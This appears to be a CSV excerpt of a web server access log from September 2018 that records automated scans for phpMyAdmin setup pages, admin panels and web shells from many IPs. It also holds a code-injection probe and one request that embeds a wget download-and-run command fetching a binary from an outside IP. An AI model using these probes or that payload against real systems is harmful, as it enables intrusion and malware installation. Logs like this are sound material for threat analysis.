"IP",           "Date",              "Method", "Status", "Size",    "URI", "UA"
"81.19.44.12","30/Sep/2018:06:26:55","GET","404","465","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"81.19.44.12","30/Sep/2018:06:26:56","GET","404","465","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"81.19.44.12","30/Sep/2018:06:26:56","GET","404","454","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"81.19.44.12","30/Sep/2018:06:26:56","GET","404","458","/pma/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"190.144.85.90","30/Sep/2018:07:40:55","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"190.144.85.90","30/Sep/2018:07:40:56","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"186.103.199.252","30/Sep/2018:09:26:25","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"186.103.199.252","30/Sep/2018:09:26:25","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"183.234.68.86","30/Sep/2018:10:47:40","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"192.95.35.228","30/Sep/2018:11:27:25","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"192.95.35.228","30/Sep/2018:11:27:26","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"118.145.3.27","30/Sep/2018:11:34:30","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"118.145.3.27","30/Sep/2018:11:34:32","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"91.134.241.204","30/Sep/2018:12:04:53","POST","200","281","/?cmd=echo(344444443%2b1);"," Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/32.0",
"103.60.167.118","30/Sep/2018:13:04:33","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"103.60.167.118","30/Sep/2018:13:04:34","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"120.24.48.143","30/Sep/2018:13:07:39","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"120.24.48.143","30/Sep/2018:13:07:40","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:14:26","GET","404","500","/test.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:29","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:34","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:34","GET","404","509","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:35","GET","404","520","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:35","GET","404","520","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:35","GET","404","525","/phpmyadmin/scripts/db___.init.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:35","GET","404","525","/phpMyAdmin/scripts/db___.init.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
"114.6.34.194","30/Sep/2018:13:14:39","POST","404","505","/wp-admins.php"," Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
"114.6.34.194","30/Sep/2018:13:14:40","POST","404","502","/wshell.php"," Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
"114.6.34.194","30/Sep/2018:13:14:41","POST","404","502","/xshell.php"," Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
"114.6.34.194","30/Sep/2018:13:14:53","POST","404","500","/test.php"," Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
"114.6.34.194","30/Sep/2018:13:14:59","POST","404","500","/test.php"," Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
"114.6.34.194","30/Sep/2018:13:15:14","GET","404","511","/phpmyadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:15","GET","404","511","/phpMyAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:17","GET","404","507","/admin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:18","GET","404","509","/dbadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:18","GET","404","516","/web/phpMyAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:18","GET","404","511","/admin/pma/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:18","GET","404","511","/admin/PMA/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:19","GET","404","513","/admin/mysql/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:19","GET","404","514","/admin/mysql2/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:19","GET","404","518","/admin/phpmyadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:20","GET","404","518","/admin/phpMyAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:20","GET","404","519","/admin/phpmyadmin2/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:20","GET","404","512","/mysqladmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:20","GET","404","513","/mysql-admin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:21","GET","404","510","/phpadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:21","GET","404","510","/phpAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:21","GET","404","513","/phpmyadmin0/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:21","GET","404","513","/phpmyadmin1/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:22","GET","404","513","/phpmyadmin2/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:22","GET","404","518","/phpMyAdmin-4.4.0/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:22","GET","404","509","/myadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:23","GET","404","510","/myadmin2/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:23","GET","404","518","/xampp/phpmyadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:23","GET","404","516","/phpMyadmin_bak/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:23","GET","404","516","/www/phpMyAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:24","GET","404","518","/tools/phpMyAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:24","GET","404","516","/phpmyadmin-old/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:24","GET","404","515","/phpMyAdminold/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:25","GET","404","516","/phpMyAdmin.old/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:25","GET","404","522","/claroline/phpMyAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:26","GET","404","518","/typo3/phpmyadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:26","GET","404","523","/phpmyadmin/phpmyadmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:27","GET","404","523","/phpMyAdmin/phpMyAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:27","GET","404","514","/phpMyAdmin__/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:27","GET","404","518","/phpMyAdmin+++---/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"114.6.34.194","30/Sep/2018:13:15:29","GET","404","510","/shaAdmin/index.php"," Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"217.128.171.65","30/Sep/2018:13:37:50","GET","400","0","/shell?cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo"," Gemini/2.0",
"111.231.190.181","30/Sep/2018:13:41:33","GET","404","473","/phpMyAdmin-3.0.1.1/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"111.231.190.181","30/Sep/2018:13:41:33","GET","404","466","/phpmyadmin3/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"190.102.146.26","30/Sep/2018:13:55:20","GET","404","500","/test.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:21","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","501","/shell.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","509","/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","520","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
"190.102.146.26","30/Sep/2018:13:55:24","GET","404","520","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
